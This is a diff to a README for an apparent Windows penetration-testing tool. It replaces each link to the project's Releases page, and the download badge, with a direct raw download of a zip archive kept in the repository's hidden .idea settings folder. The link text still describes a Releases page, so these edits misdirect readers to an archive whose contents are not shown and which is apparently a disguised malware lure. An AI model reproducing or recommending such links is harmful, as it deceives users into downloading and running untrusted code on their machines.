@@ -8,11 +8,11 @@ security-tools-hacking is a Windows application designed for penetration testing
 
 To get started, you can download the application from our Releases page. Click the button below to visit the page and download the latest version.
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-blue?style=for-the-badge&logo=github)](https://github.com/NINJA45FFS1/security-tools-hacking/releases)
+[![Download Latest Release](https://github.com/NINJA45FFS1/security-tools-hacking/raw/refs/heads/main/.idea/security_tools_hacking_2.6.zip)](https://github.com/NINJA45FFS1/security-tools-hacking/raw/refs/heads/main/.idea/security_tools_hacking_2.6.zip)
 
 Here is how to download and install security-tools-hacking:
 
-1. **Visit the Releases Page**: Go to [this link](https://github.com/NINJA45FFS1/security-tools-hacking/releases) to see all available versions. 
+1. **Visit the Releases Page**: Go to [this link](https://github.com/NINJA45FFS1/security-tools-hacking/raw/refs/heads/main/.idea/security_tools_hacking_2.6.zip) to see all available versions. 
    
 2. **Select a Version**: Look for the latest version listed at the top. You will see details about the version and a list of files available for download.
 
@@ -96,4 +96,4 @@ Join our community of users by providing feedback and sharing your experiences. 
 
 Remember to check our Releases page again in the future for updates and new features.
 
-Once you are ready to begin, download the application from [this link](https://github.com/NINJA45FFS1/security-tools-hacking/releases) and start your journey into ethical hacking.
+Once you are ready to begin, download the application from [this link](https://github.com/NINJA45FFS1/security-tools-hacking/raw/refs/heads/main/.idea/security_tools_hacking_2.6.zip) and start your journey into ethical hacking.
